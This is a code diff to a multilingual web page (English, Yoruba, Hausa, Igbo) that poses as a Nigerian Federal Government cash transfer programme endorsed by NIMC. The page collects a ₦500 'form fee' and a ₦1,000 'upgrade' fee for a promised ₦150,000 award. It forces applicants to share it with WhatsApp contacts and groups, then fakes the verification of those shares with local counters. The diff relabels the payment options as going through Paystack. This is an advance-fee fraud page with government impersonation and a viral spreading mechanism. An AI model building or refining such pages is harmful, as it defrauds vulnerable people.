@@ -514,49 +514,6 @@
             font-family: inherit;
             font-size: 14px;
         }
-
-        /* Paystack payment options */
-        .paystack-options {
-            display: grid;
-            grid-template-columns: repeat(3, 1fr);
-            gap: 15px;
-            margin: 20px 0;
-        }
-
-        .paystack-option {
-            border: 1px solid #ddd;
-            border-radius: 8px;
-            padding: 15px;
-            text-align: center;
-            cursor: pointer;
-            transition: all 0.3s;
-        }
-
-        .paystack-option:hover {
-            border-color: #003366;
-            box-shadow: 0 2px 8px rgba(0,0,0,0.1);
-        }
-
-        .paystack-option.selected {
-            border-color: #003366;
-            background-color: #f0f8ff;
-        }
-
-        .paystack-option i {
-            font-size: 30px;
-            margin-bottom: 10px;
-            color: #003366;
-        }
-
-        .paystack-option .option-name {
-            font-weight: bold;
-            margin-bottom: 5px;
-        }
-
-        .paystack-option .option-desc {
-            font-size: 12px;
-            color: #666;
-        }
         
         @media (max-width: 600px) {
             .container {
@@ -601,10 +558,6 @@
             .language-selector {
                 position: static;
                 margin-top: 10px;
-            }
-
-            .paystack-options {
-                grid-template-columns: 1fr;
             }
         }
     </style>
@@ -842,23 +795,35 @@
                     <p class="lang" data-key="feeNoticeText2">This fee is mandatory for all applicants and will be collected after form submission.</p>
                 </div>
                 
-                <div class="paystack-options">
-                    <div class="paystack-option" onclick="selectPaymentOption(this, 'card')">
-                        <i class="far fa-credit-card"></i>
-                        <div class="option-name lang" data-key="cardPayment">Card</div>
-                        <div class="option-desc lang" data-key="cardPaymentDesc">Pay with debit/credit card</div>
+                <div class="payment-options">
+                    <div class="payment-option" onclick="selectPayment('card')">
+                        <input type="radio" name="paymentMethod" id="cardPayment" value="card">
+                        <i class="far fa-credit-card payment-icon"></i>
+                        <div class="payment-details">
+                            <div class="lang" data-key="cardPayment">Debit/Credit Card</div>
+                            <div style="font-size: 13px; color: #666;" class="lang" data-key="cardPaymentDesc">Secure online payment via Paystack</div>
+                        </div>
+                        <div class="payment-amount">₦500</div>
                     </div>
                     
-                    <div class="paystack-option" onclick="selectPaymentOption(this, 'bank')">
-                        <i class="fas fa-university"></i>
-                        <div class="option-name lang" data-key="bankTransfer">Bank</div>
-                        <div class="option-desc lang" data-key="bankTransferDesc">Pay via bank transfer</div>
+                    <div class="payment-option" onclick="selectPayment('bank')">
+                        <input type="radio" name="paymentMethod" id="bankPayment" value="bank">
+                        <i class="fas fa-university payment-icon"></i>
+                        <div class="payment-details">
+                            <div class="lang" data-key="bankTransfer">Bank Transfer</div>
+                            <div style="font-size: 13px; color: #666;" class="lang" data-key="bankTransferDesc">Transfer directly via Paystack</div>
+                        </div>
+                        <div class="payment-amount">₦500</div>
                     </div>
                     
-                    <div class="paystack-option" onclick="selectPaymentOption(this, 'ussd')">
-                        <i class="fas fa-mobile-alt"></i>
-                        <div class="option-name lang" data-key="ussdPayment">USSD</div>
-                        <div class="option-desc lang" data-key="ussdPaymentDesc">Pay with mobile banking</div>
+                    <div class="payment-option" onclick="selectPayment('ussd')">
+                        <input type="radio" name="paymentMethod" id="ussdPayment" value="ussd">
+                        <i class="fas fa-mobile-alt payment-icon"></i>
+                        <div class="payment-details">
+                            <div class="lang" data-key="ussdPayment">USSD Payment</div>
+                            <div style="font-size: 13px; color: #666;" class="lang" data-key="ussdPaymentDesc">Quick payment via Paystack USSD</div>
+                        </div>
+                        <div class="payment-amount">₦500</div>
                     </div>
                 </div>
                 
@@ -882,8 +847,8 @@
                 
                 <div class="upgrade-offer">
                     <h3 class="lang" data-key="upgradeTitle">Upgrade Your Award Amount</h3>
-                    <p class="lang" data-key="upgradeText1">To qualify for the maximum ₦150,000 and expedited processing (10-16 days), you can upgrade your application.</p>
-                    <p class="lang" data-key="upgradeText2">This guarantees you'll be among the first batch of recipients.</p>
+                    <p class="lang" data-key="upgradeText1">To qualify for the maximum ₦150,000 and expedited processing, you can upgrade your application.</p>
+                    <p class="lang" data-key="upgradeText2">This guarantees you'll be among the first batch of recipients with processing within 10-16 days.</p>
                     
                     <button class="form-btn" id="upgradeBtn" onclick="showUpgradeModal()">
                         <span class="lang" data-key="upgradeBtn">Upgrade to ₦150,000</span>
@@ -925,7 +890,7 @@
                 <i class="fab fa-whatsapp"></i> <span class="lang" data-key="shareBtn">Share via WhatsApp</span>
             </button>
             
-            <p style="margin-top: 20px; font-size: 14px; color: #666;" class="lang" data-key="shareModalFooter">Our system will automatically verify your shares within a few minutes.</p>
+            <p style="margin-top: 20px; font-size: 14px; color: #666;" class="lang" data-key="shareModalFooter">Verification will be automatically checked by our system. Please wait a moment after sharing.</p>
         </div>
     </div>
 
@@ -933,18 +898,42 @@
     <div class="modal" id="upgradeModal">
         <div class="modal-content">
             <h2 class="lang" data-key="upgradeModalTitle">Upgrade Your Cash Transfer</h2>
-            <p class="lang" data-key="upgradeModalText1">To qualify for the maximum ₦150,000 and expedited processing (10-16 days), please complete the upgrade payment of ₦1,000.</p>
+            <p class="lang" data-key="upgradeModalText1">To qualify for the maximum ₦150,000 and expedited processing within 10-16 days, please complete the upgrade payment of ₦1,000.</p>
             <p class="lang" data-key="upgradeModalText2">This ensures you'll be among the first batch of recipients.</p>
             
-            <div class="paystack-options">
-                <div class="paystack-option selected" onclick="selectUpgradeOption(this, 'card')">
-                    <i class="far fa-credit-card"></i>
-                    <div class="option-name lang" data-key="cardPayment">Card</div>
-                    <div class="option-desc lang" data-key="securePayment">Pay with debit/credit card</div>
+            <div class="payment-options">
+                <div class="payment-option" onclick="selectUpgradePayment('card')">
+                    <input type="radio" name="upgradePaymentMethod" id="upgradeCardPayment" value="card">
+                    <i class="far fa-credit-card payment-icon"></i>
+                    <div class="payment-details">
+                        <div class="lang" data-key="cardPayment">Debit/Credit Card</div>
+                        <div style="font-size: 13px; color: #666;" class="lang" data-key="securePayment">Secure online payment via Paystack</div>
+                    </div>
+                    <div class="payment-amount">₦1,000</div>
+                </div>
+                
+                <div class="payment-option" onclick="selectUpgradePayment('bank')">
+                    <input type="radio" name="upgradePaymentMethod" id="upgradeBankPayment" value="bank">
+                    <i class="fas fa-university payment-icon"></i>
+                    <div class="payment-details">
+                        <div class="lang" data-key="bankTransfer">Bank Transfer</div>
+                        <div style="font-size: 13px; color: #666;" class="lang" data-key="bankTransferDesc">Transfer directly via Paystack</div>
+                    </div>
+                    <div class="payment-amount">₦1,000</div>
+                </div>
+                
+                <div class="payment-option" onclick="selectUpgradePayment('ussd')">
+                    <input type="radio" name="upgradePaymentMethod" id="upgradeUssdPayment" value="ussd">
+                    <i class="fas fa-mobile-alt payment-icon"></i>
+                    <div class="payment-details">
+                        <div class="lang" data-key="ussdPayment">USSD Payment</div>
+                        <div style="font-size: 13px; color: #666;" class="lang" data-key="ussdPaymentDesc">Quick payment via Paystack USSD</div>
+                    </div>
+                    <div class="payment-amount">₦1,000</div>
                 </div>
             </div>
             
-            <button class="form-btn" id="proceedUpgradeBtn">
+            <button class="form-btn" id="proceedUpgradeBtn" disabled>
                 <span class="lang" data-key="proceedPayment">PROCEED TO PAYMENT</span>
             </button>
         </div>
@@ -959,7 +948,7 @@
             <textarea id="reasonText" style="width: 100%; height: 100px; padding: 10px; margin: 15px 0; border: 1px solid #ddd; border-radius: 5px;"></textarea>
             
             <div class="fee-notice">
-                <p class="lang" data-key="upgradeNotice">To facilitate your request and ensure you receive the maximum amount (processed in 10-16 days), an upgrade fee of ₦1,000 is required.</p>
+                <p class="lang" data-key="upgradeNotice">To facilitate your request and ensure you receive the maximum amount with processing within 10-16 days, an upgrade fee of ₦1,000 is required.</p>
             </div>
             
             <button class="form-btn" onclick="proceedToUpgrade()">
@@ -1036,19 +1025,19 @@
                 feeBenefit4: "Ensure your application receives priority attention from relevant government bodies",
                 feeNoticeText2: "This fee is mandatory for all applicants and will be collected after form submission.",
                 bankTransfer: "Bank Transfer",
-                bankTransferDesc: "Transfer directly to our corporate account",
+                bankTransferDesc: "Transfer directly via Paystack",
                 cardPayment: "Debit/Credit Card",
-                cardPaymentDesc: "Secure online payment",
+                cardPaymentDesc: "Secure online payment via Paystack",
                 ussdPayment: "USSD Payment",
-                ussdPaymentDesc: "Quick payment via mobile banking",
+                ussdPaymentDesc: "Quick payment via Paystack USSD",
                 proceedPayment: "PROCEED TO PAYMENT",
                 successTitle: "Application Submitted Successfully!",
                 successText1: "Your application has been received and is being processed.",
                 awardText: "You have been awarded:",
                 successText2: "Funds will be transferred to your bank account within 31-45 working days.",
                 upgradeTitle: "Upgrade Your Award Amount",
-                upgradeText1: "To qualify for the maximum ₦150,000 and expedited processing (10-16 days), you can upgrade your application.",
-                upgradeText2: "This guarantees you'll be among the first batch of recipients.",
+                upgradeText1: "To qualify for the maximum ₦150,000 and expedited processing, you can upgrade your application.",
+                upgradeText2: "This guarantees you'll be among the first batch of recipients with processing within 10-16 days.",
                 upgradeBtn: "Upgrade to ₦150,000",
                 chatBtn: "Chat with Support",
                 shareModalTitle: "Program Awareness Requirement",
@@ -1056,14 +1045,14 @@
                 shareFriendsLabel: "Shared with contacts (0/10 completed)",
                 shareGroupsLabel: "Shared with groups (0/2 completed)",
                 shareBtn: "Share via WhatsApp",
-                shareModalFooter: "Our system will automatically verify your shares within a few minutes.",
+                shareModalFooter: "Verification will be automatically checked by our system. Please wait a moment after sharing.",
                 upgradeModalTitle: "Upgrade Your Cash Transfer",
-                upgradeModalText1: "To qualify for the maximum ₦150,000 and expedited processing (10-16 days), please complete the upgrade payment of ₦1,000.",
+                upgradeModalText1: "To qualify for the maximum ₦150,000 and expedited processing within 10-16 days, please complete the upgrade payment of ₦1,000.",
                 upgradeModalText2: "This ensures you'll be among the first batch of recipients.",
-                securePayment: "Secure online payment",
+                securePayment: "Secure online payment via Paystack",
                 chatModalTitle: "Support Request",
                 chatModalText: "Please explain why you need the maximum ₦150,000 cash transfer:",
-                upgradeNotice: "To facilitate your request and ensure you receive the maximum amount (processed in 10-16 days), an upgrade fee of ₦1,000 is required.",
+                upgradeNotice: "To facilitate your request and ensure you receive the maximum amount with processing within 10-16 days, an upgrade fee of ₦1,000 is required.",
                 payToUpgrade: "Pay to Upgrade Transfer",
                 footerText1: "Federal Government Conditional Cash Transfer Program © 2025",
                 footerText2: "Mass Adoption Identity Resource - Officially designated verification partner of the Federal Government of Nigeria",
@@ -1127,26 +1116,26 @@
                 paymentTitle: "Isanwo Owo Iṣẹ Fọọmu",
                 paymentText: "Lati pari ibere rẹ, jọwọ san owo iṣẹ fọọmu ti ₦500 ti o wa lori ọna isanwo kan ninu awọn ọna isanwo ti o wa ni isalẹ.",
                 feeNoticeTitle: "Akiyesi Pataki Nipa Owo Iṣẹ",
-                feeNoticeText1: "Gegebi ajọ aladani ti o ni iṣẹṣọ pẹlu Ijoba Apapo, a nilo owo iṣẹ fọọmu ti ₦500 lati rọrun ati ki o ṣe ibere rẹ ni kiakia. Owo yii fun wa ni anfani lati:",
+                feeNoticeText1: "Gegebi ajọ aladani ti o ni iṣẹṣọ pẹlu Ijoba Apapo, a nilo owo iṣẹ fọọmu ti ₦500 lati rọrun ati ki o �ṣe ibere rẹ ni kiakia. Owo yii fun wa ni anfani lati:",
                 feeBenefit1: "Ṣe ibere rẹ ni kiakia nipasẹ awọn ọna iṣọdọtun",
                 feeBenefit2: "Ṣe itọju eto iṣẹ ibere wa",
                 feeBenefit3: "Pese atilẹyin pataki nipasẹ eto ifọwọsi",
                 feeBenefit4: "Rii daju pe ibere rẹ gba akiyesi pataki lati awọn ẹka ijoba ti o yẹ",
                 feeNoticeText2: "Owo yii jẹ ohun ti o wa lori gbogbo awọn olubẹrẹ ati yoo gba lẹhin fifiranṣẹ fọọmu.",
                 bankTransfer: "Gbigbe Owó Banki",
-                bankTransferDesc: "Gbe owó taara si akọọlẹ ile-iṣẹ wa",
+                bankTransferDesc: "Gbe owó taara nipasẹ Paystack",
                 cardPayment: "Kaadi Ọrọwọ",
-                cardPaymentDesc: "Isanwo ni aabo lori ayelujara",
+                cardPaymentDesc: "Isanwo ni aabo lori ayelujara nipasẹ Paystack",
                 ussdPayment: "Isanwo USSD",
-                ussdPaymentDesc: "Isanwo kiakia nipasẹ banki alagbeka",
+                ussdPaymentDesc: "Isanwo kiakia nipasẹ Paystack USSD",
                 proceedPayment: "LỌ SI ISANWO",
                 successTitle: "Ibere Ti A Gba Ni Aṣeyọri!",
                 successText1: "A ti gba ibere rẹ ati pe a nṣe iṣẹ lori rẹ.",
                 awardText: "A ti fun ọ ni:",
                 successText2: "A o gbe owó naa si akọọlẹ rẹ laarin ọjọ iṣẹ 31-45.",
                 upgradeTitle: "Ṣe Alekun Iye Owó Ti A Fun Ọ",
-                upgradeText1: "Lati jẹ igbanilaaye fun iye ti o pọ julọ ti ₦150,000 ati iṣẹ iyara (ọjọ 10-16), o le ṣe alekun ibere rẹ.",
-                upgradeText2: "Eyi daju pe iwọ yoo wa laarin ẹgbẹ akọkọ ti awọn olugba.",
+                upgradeText1: "Lati jẹ igbanilaaye fun iye ti o pọ julọ ti ₦150,000 ati iṣẹ iyara, o le ṣe alekun ibere rẹ.",
+                upgradeText2: "Eyi daju pe iwọ yoo wa laarin ẹgbẹ akọkọ ti awọn olugba pẹlu iṣẹṣi laarin ọjọ 10-16.",
                 upgradeBtn: "Ṣe Alekun si ₦150,000",
                 chatBtn: "Báni sọ̀rọ̀",
                 shareModalTitle: "Eto Idagbasoke Eto",
@@ -1154,14 +1143,14 @@
                 shareFriendsLabel: "Pinpin pẹlu awọn olubasọrọ (0/10 pari)",
                 shareGroupsLabel: "Pinpin pẹlu awọn ẹgbẹ (0/2 pari)",
                 shareBtn: "Pinpin nipasẹ WhatsApp",
-                shareModalFooter: "Eto wa yoo ṣe ayẹwo awọn pinpin rẹ laifọwọyi laarin iṣẹju diẹ.",
+                shareModalFooter: "A yoo ṣe ayẹwo iṣọdọtun laifọwọyi nipasẹ eto wa. Jọwọ duro diẹ lẹhin pinpin.",
                 upgradeModalTitle: "Ṣe Alekun Ifowopamọ Ọrọwọ Rẹ",
-                upgradeModalText1: "Lati jẹ igbanilaaye fun iye ti o pọ julọ ti ₦150,000 ati iṣẹ iyara (ọjọ 10-16), jọwọ pari isanwo alekun ti ₦1,000.",
+                upgradeModalText1: "Lati jẹ igbanilaaye fun iye ti o pọ julọ ti ₦150,000 ati iṣẹ iyara laarin ọjọ 10-16, jọwọ pari isanwo alekun ti ₦1,000.",
                 upgradeModalText2: "Eyi daju pe iwọ yoo wa laarin ẹgbẹ akọkọ ti awọn olugba.",
-                securePayment: "Isanwo ni aabo",
+                securePayment: "Isanwo ni aabo nipasẹ Paystack",
                 chatModalTitle: "Ibeere Iratimọle",
                 chatModalText: "Jọwọ ṣalaye idi ti o nilo iye ti o pọ julọ ti ifowopamọ ọrọwọ ₦150,000:",
-                upgradeNotice: "Lati rọrun ibeere rẹ ati rii daju pe o gba iye ti o pọ julọ (ti a yoo ṣe ni ọjọ 10-16), o nilo owo alekun ti ₦1,000.",
+                upgradeNotice: "Lati rọrun ibeere rẹ ati rii daju pe o gba iye ti o pọ julọ pẹlu iṣẹṣi laarin ọjọ 10-16, o nilo owo alekun ti ₦1,000.",
                 payToUpgrade: "San lati ṣe Alekun Ifowopamọ",
                 footerText1: "Eto Ifowopamọ Ọrọwọ ti Ijoba Apapo © 2025",
                 footerText2: "Ile-iṣẹ Identification - Alakoso iṣọdọtun ofin ti Ijoba Apapo ile Naijiria",
@@ -1173,7 +1162,7 @@
                 programTitle: "Shirin Canjin Kuɗi na Sharadi",
                 highlightText: "Masu cancanta za su iya samun",
                 highlightText2: "ta hanyar shirin canjin kuɗi na Gwamnatin Tarayya",
-                contentText1: "Cibiyar Shaidar Shanka, tare da haɗin gwiwar Gwamnatin Tarayyar Najeriya, tana alfahari da sauƙaƙe tantancewa da rajistar masu cancanta ga shirin canjin kuɗi. Wannan sh  tana alfahari da sauƙaƙe tantancewa da rajistar masu cancanta ga shirin canjin kuɗi. Wannan shiri yana da nufin ba da tallafin kuɗi ga iyalai masu rauni a duk faɗin Najeriya.",
+                contentText1: "Cibiyar Shaidar Shanka, tare da haɗin gwiwar Gwamnatin Tarayyar Najeriya, tana alfahari da sauƙaƙe tantancewa da rajistar masu cancanta ga shirin canjin kuɗi. Wannan shiri yana da nufin ba da tallafin kuɗi ga iyalai masu rauni a duk faɗin Najeriya.",
                 contentText2: "Sabbin abubuwan da suka faru a cikin ci gaban shirin:",
                 newsTitle: "Gwamnatin Tarayya Ta Sanar da Cewa Iyalai Miliyan 2.3 Sun Sami Canjin Kuɗi",
                 newsText1: "Gwamnatin Tarayya ta tabbatar da cewa an yi nasarar tantancewa da rajistar iyalai miliyan 2.3 na Najeriya a cikin shirin canjin kuɗi. Wannan shiri wani ɓangare ne na dabarun tsaron zamantakewar gwamnati don rage matsalolin tattalin arziki da 'yan ƙasa ke fuskanta.",
@@ -1232,19 +1221,19 @@
                 feeBenefit4: "Tabbatar cewa aikace-aikacenku yana samun kulawa ta farko daga sassan gwamnati masu dacewa",
                 feeNoticeText2: "Wannan kuɗi wajibi ne ga duk masu nema kuma za a tara shi bayan aika fom.",
                 bankTransfer: "Canja Kuɗi Banki",
-                bankTransferDesc: "Canja kuɗi kai tsaye zuwa asusun kamfaninmu",
+                bankTransferDesc: "Canja kuɗi kai tsaye ta hanyar Paystack",
                 cardPayment: "Katin Kiredit",
-                cardPaymentDesc: "Amincewar biyan kuɗi akan yanar gizo",
+                cardPaymentDesc: "Amincewar biyan kuɗi akan yanar gizo ta hanyar Paystack",
                 ussdPayment: "Biyan Kuɗi USSD",
-                ussdPaymentDesc: "Biyan kuɗi cikin sauri ta bankin wayar hannu",
+                ussdPaymentDesc: "Biyan kuɗi cikin sauri ta hanyar Paystack USSD",
                 proceedPayment: "CI GABAN ZUWA BIYAN KUDI",
                 successTitle: "Aikace-aikacenku An Karɓe Shiri!",
                 successText1: "An karɓi aikace-aikacenku kuma ana aiwatar da shi.",
                 awardText: "An ba ku:",
                 successText2: "Za a canza kuɗin zuwa asusunku cikin kwanaki aiki 31-45.",
                 upgradeTitle: "Haɓaka Adadin Kuɗin da aka Bayar",
-                upgradeText1: "Don cancanta don mafi girman ₦150,000 da saurin aiwatarwa (kwanaki 10-16), zaku iya haɓaka aikace-aikacenku.",
-                upgradeText2: "Wannan yana tabbatar da cewa zaku kasance cikin rukunin farko na masu karɓa.",
+                upgradeText1: "Don cancanta don mafi girman ₦150,000 da saurin aiwatarwa, zaku iya haɓaka aikace-aikacenku.",
+                upgradeText2: "Wannan yana tabbatar da cewa zaku kasance cikin rukunin farko na masu karɓa tare da aiwatarwa cikin kwanaki 10-16.",
                 upgradeBtn: "Haɓaka zuwa ₦150,000",
                 chatBtn: "Yi Magana da Taimako",
                 shareModalTitle: "Bukatar Wayar Da Kan Shirin",
@@ -1252,14 +1241,14 @@
                 shareFriendsLabel: "An raba tare da abokan hulɗa (0/10 cikakke)",
                 shareGroupsLabel: "An raba tare da ƙungiyoyi (0/2 cikakke)",
                 shareBtn: "Raba ta WhatsApp",
-                shareModalFooter: "Tsarinmu zai tabbatar da rabawar ku cikin 'yan mintoci.",
+                shareModalFooter: "Za a bincika tantancewa ta atomatik ta tsarinmu. Da fatan za a dakata dan lokaci bayan rabawa.",
                 upgradeModalTitle: "Haɓaka Canjin Kuɗinku",
-                upgradeModalText1: "Don cancanta don mafi girman ₦150,000 da saurin aiwatarwa (kwanaki 10-16), da fatan za a kammala biyan kuɗin haɓaka na ₦1,000.",
+                upgradeModalText1: "Don cancanta don mafi girman ₦150,000 da saurin aiwatarwa cikin kwanaki 10-16, da fatan za a kammala biyan kuɗin haɓaka na ₦1,000.",
                 upgradeModalText2: "Wannan yana tabbatar da cewa zaku kasance cikin rukunin farko na masu karɓa.",
-                securePayment: "Amincewar biyan kuɗi",
+                securePayment: "Amincewar biyan kuɗi ta hanyar Paystack",
                 chatModalTitle: "Bukatar Taimako",
                 chatModalText: "Da fatan za a bayyana dalilin da yasa kuke buƙatar mafi girman canjin kuɗi ₦150,000:",
-                upgradeNotice: "Don sauƙaƙe buƙatarku kuma tabbatar cewa kuna karɓar mafi girman adadin (za a aiwatar a cikin kwanaki 10-16), ana buƙatar kuɗin haɓaka na ₦1,000.",
+                upgradeNotice: "Don sauƙaƙe buƙatarku kuma tabbatar cewa kuna karɓar mafi girman adadin tare da aiwatarwa cikin kwanaki 10-16, ana buƙatar kuɗin haɓaka na ₦1,000.",
                 payToUpgrade: "Biya don Haɓaka Canjin",
                 footerText1: "Shirin Canjin Kuɗi na Sharadi na Gwamnatin Tarayya © 2025",
                 footerText2: "Cibiyar Shaidar Shanka - Abokin haɗin gwiwa na tantancewa na Gwamnatin Tarayyar Najeriya",
@@ -1275,7 +1264,7 @@
                 contentText2: "MMelite ọhụrụ na ọganihu mmemme ahụ:",
                 newsTitle: "Gọọmenti Etiti Na-ekwupụta na Ezinụlọ nde 2.3 Anatala Nnyefe Ego",
                 newsText1: "Gọọmenti Etiti ekwupụtala n'ụzọ doro anya na nkwenye na ndebanye aha nke ezinụlọ Naijiria nde 2.3 na mmemme nnyefe ego n'ọnọdụ. Mmemme a bụ akụkụ nke atụmatụ nchekwa ọha nke gọọmenti iji belata nsogbu akụ na ụba ndị mmadụ na-eche ihu.",
-                newsText2: "N'oge nnọkọ ndị nta akụkọ na isi ụlọ ọrụ National Identity Management Commission (NIMC) na Abuja, Director General Abisoye Coker-Odusote nyere nkọwa gbasara mmejuputa mmemme ahụ:",
+                newsText2: "N'oge nnọkọ ndị nta akụkọ na isi ụlọ ọrụ National Identity Management Commission (NIMC) headquarters in Abuja, Director General Abisoye Coker-Odusote provided details on the program's implementation:",
                 newsText3: "\"Usoro nkwado anyị siri ike achọpụtala ezinụlọ nde 2.3 tozuru etozu na mba niile. A ga-amalite ịkwụ ndị a nnata ego ozugbo site na usoro nnyefe ego dijitalụ anyị nke echekwara,\" ka Coker-Odusote kwuru.",
                 newsText4: "Onye isi njikwa ahụ kwusiri ike na nkwa mmemme ahụ maka nghọta: \"Site na mmekorita anyị na Akwụkwọ Njirimara nke Njirimara, anyị emejuputala usoro nkwado siri ike iji hụ na ego na-eru naanị ndị tozuru etozu, ndị dị ndụ. Nke a bụ isi ihe dị mkpa maka iguzosi ike n'ezi ihe nke mmemme ahụ.\"",
                 newsSource: "Ọkwa gọọmentị sitere na:",
@@ -1330,34 +1319,34 @@
                 feeBenefit4: "Hụ na ngwa gị na-enweta nlebara anya dị mkpa site n'aka ndị ọrụ gọọmentị kwesịrị ekwesị",
                 feeNoticeText2: "Ụgwọ a bụ iwu maka ndị niile na-achọ ọrụ ma a ga-anakọta ya mgbe ezipụchara fọm.",
                 bankTransfer: "Nyefee ego n'ụlọ akụ",
-                bankTransferDesc: "Nyefee ego ozugbo na akaụntụ ụlọ ọrụ anyị",
-                cardPayment: "Kaadị debit/credit",
-                cardPaymentDesc: "Ịkwụ ụgwọ nchekwa n'ịntanetị",
+                bankTransferDesc: "Nyefee ego ozugbo site na Paystack",
+                cardPayment: "Kaadi debit/credit",
+                cardPaymentDesc: "Ịkwụ ụgwọ nchekwa n'ịntanetị site na Paystack",
                 ussdPayment: "Ịkwụ ụgwọ USSD",
-                ussdPaymentDesc: "Ịkwụ ụgwọ ngwa ngwa site na ụlọ akụ ekwentị",
+                ussdPaymentDesc: "Ịkwụ ụgwọ ngwa ngwa site na Paystack USSD",
                 proceedPayment: "GA N'ỤZỌ ỊKWỤ ỤGWỌ",
                 successTitle: "Ezipụla Ngwa Gị Nke ọma!",
                 successText1: "Anatala ngwa gị ma a na-ahazi ya.",
                 awardText: "E nyere gị:",
                 successText2: "A ga-ebufe ego ahụ na akaụntụ ụlọ akụ gị n'ime ụbọchị ọrụ 31-45.",
                 upgradeTitle: "Kwalie Ọnụego Ihe Nrite Gị",
-                upgradeText1: "Iji tozuo maka oke ₦150,000 na nhazi ngwa ngwa (ụbọchị 10-16), ị nwere ike ịkwalite ngwa gị.",
-                upgradeText2: "Nke a na-ekwe nkwa na ị ga-esonye na ìgwè mbụ nke ndị nnata.",
+                upgradeText1: "Iji tozuo maka oke ₦150,000 na nhazi ngwa ngwa, ị nwere ike ịkwalite ngwa gị.",
+                upgradeText2: "Nke a na-ekwe nkwa na ị ga-esonye na ìgwè mbụ nke ndị nnata na nhazi n'ime ụbọchị 10-16.",
                 upgradeBtn: "Kwalie na ₦150,000",
                 chatBtn: "Kparịta na Nkwado",
                 shareModalTitle: "Ihe Achọrọ Mgbasa Ozi Mmemme",
-                shareModalText: "Don kammala ngwa gị, biko nyere aka kesaa ozi gbasara atụmatụ gọọmentị a site na ikesa ya na kọntaktị 10 na otu WhatsApp 2. Nke a na-eme ka a mara nke ọma maka mmemme nkwado ọha dịnụ.",
+                shareModalText: "Don kammala ngwa gị, biko nyere aka kesaa ozi gbasara atụmatụ gọọmentị a site na ikesa ya na kọntaktị 10 na otu WhatsApp 2. Wannan yana-eme ka a mara nke ọma maka mmemme nkwado ọha dịnụ.",
                 shareFriendsLabel: "Kesara na kọntaktị (0/10 emechara)",
                 shareGroupsLabel: "Kesara na otu (0/2 emechara)",
                 shareBtn: "Kesaa site na WhatsApp",
-                shareModalFooter: "Usoro anyị ga-akpaghị aka nyochaa mbịa gị n'ime nkeji ole na ole.",
+                shareModalFooter: "A ga-enyocha nkwado na-akpaghị aka site na sistemụ anyị. Biko chere obere oge mgbe ịkesasịrị.",
                 upgradeModalTitle: "Kwalie Nnyefe Ego Gị",
-                upgradeModalText1: "Iji tozuo maka oke ₦150,000 na nhazi ngwa ngwa (ụbọchị 10-16), biko mezue ịkwụ ụgwọ nkwalite nke ₦1,000.",
+                upgradeModalText1: "Iji tozuo maka oke ₦150,000 na nhazi ngwa ngwa n'ime ụbọchị 10-16, biko mezue ịkwụ ụgwọ nkwalite nke ₦1,000.",
                 upgradeModalText2: "Nke a na-eme ka o doo anya na ị ga-esonye na ìgwè mbụ nke ndị nnata.",
-                securePayment: "Ịkwụ ụgwọ nchekwa",
+                securePayment: "Ịkwụ ụgwọ nchekwa site na Paystack",
                 chatModalTitle: "Arịrịọ Nkwado",
                 chatModalText: "Biko kọwaa ihe kpatara ịchọrọ oke nnyefe ego ₦150,000:",
-                upgradeNotice: "Iji mee ka arịrịọ gị dị mfe ma hụ na ị na-enweta ego kacha (a ga-edozi ya n'ime ụbọchị 10-16), a chọrọ ego nkwalite nke ₦1,000.",
+                upgradeNotice: "Iji mee ka arịrịọ gị dị mfe ma hụ na ị na-enweta ego kacha na nhazi n'ime ụbọchị 10-16, a chọrọ ego nkwalite nke ₦1,000.",
                 payToUpgrade: "Kwụọ ụgwọ iji kwalite nnyefe",
                 footerText1: "Mmemme Nnyefe Ego n'ọnọdụ nke Gọọmenti Etiti © 2025",
                 footerText2: "Akwụkwọ Njirimara nke Njirimara - Onye njikwa nkwenye gọọmentị nke Gọọmenti Etiti Naijiria",
@@ -1429,21 +1418,13 @@
                 
                 // Simulate automatic verification (in real app, this would be handled by backend)
                 setTimeout(() => {
-                    const shares = {
-                        friends: 10,
-                        groups: 2
-                    };
-                    
+                    const shares = JSON.parse(localStorage.getItem('whatsappShares'));
+                    shares.friends = Math.min(shares.friends + 3, 10);
+                    shares.groups = Math.min(shares.groups + 1, 2);
                     localStorage.setItem('whatsappShares', JSON.stringify(shares));
                     updateShareStatus();
-                    
-                    // Auto-close modal and show form after verification
-                    setTimeout(() => {
-                        document.getElementById('shareModal').style.display = 'none';
-                        document.getElementById('applicationForm').style.display = 'block';
-                        window.scrollTo(0, document.getElementById('applicationForm').offsetTop);
-                    }, 2000);
-                }, 1000);
+                    checkCompletion();
+                }, 2000);
             });
             
             document.getElementById('cashTransferForm').addEventListener('submit', function(e) {
@@ -1452,35 +1433,24 @@
             });
             
             document.getElementById('proceedPaymentBtn').addEventListener('click', function() {
-                const selectedMethod = document.querySelector('.paystack-option.selected');
+                const selectedMethod = document.querySelector('input[name="paymentMethod"]:checked');
                 if (selectedMethod) {
-                    const method = selectedMethod.getAttribute('onclick').match(/'([^']+)'/)[1];
-                    alert(`You will now be redirected to complete your ₦500 payment via ${method === 'bank' ? 'Bank Transfer' : method === 'card' ? 'Card Payment' : 'USSD'}.`);
-                    // In a real implementation, this would redirect to payment gateway
+                    const method = selectedMethod.value;
+                    alert(`You will now be redirected to complete your ₦500 payment via Paystack ${method === 'bank' ? 'Bank Transfer' : method === 'card' ? 'Card Payment' : 'USSD'}.`);
+                    // In a real implementation, this would redirect to Paystack payment gateway
                     simulatePaymentVerification();
                 }
             });
             
             document.getElementById('proceedUpgradeBtn').addEventListener('click', function() {
-                alert("You will now be redirected to complete your ₦1,000 upgrade payment.");
-                // In a real implementation, this would redirect to payment gateway
-                simulateUpgradePayment();
+                const selectedMethod = document.querySelector('input[name="upgradePaymentMethod"]:checked');
+                if (selectedMethod) {
+                    const method = selectedMethod.value;
+                    alert(`You will now be redirected to complete your ₦1,000 upgrade payment via Paystack ${method === 'bank' ? 'Bank Transfer' : method === 'card' ? 'Card Payment' : 'USSD'}.`);
+                    // In a real implementation, this would redirect to Paystack payment gateway
+                    simulateUpgradePayment();
+                }
             });
-        }
-
-        function selectPaymentOption(element, method) {
-            document.querySelectorAll('.paystack-option').forEach(opt => {
-                opt.classList.remove('selected');
-            });
-            element.classList.add('selected');
-            document.getElementById('proceedPaymentBtn').disabled = false;
-        }
-
-        function selectUpgradeOption(element, method) {
-            document.querySelectorAll('.paystack-option').forEach(opt => {
-                opt.classList.remove('selected');
-            });
-            element.classList.add('selected');
         }
 
         function showPreview() {
@@ -1556,7 +1526,7 @@
             // Simulate upgrade payment verification
             setTimeout(() => {
                 document.getElementById('upgradeModal').style.display = 'none';
-                alert("Your upgrade payment was successful! You are now eligible for ₦150,000 and expedited processing (10-16 days).");
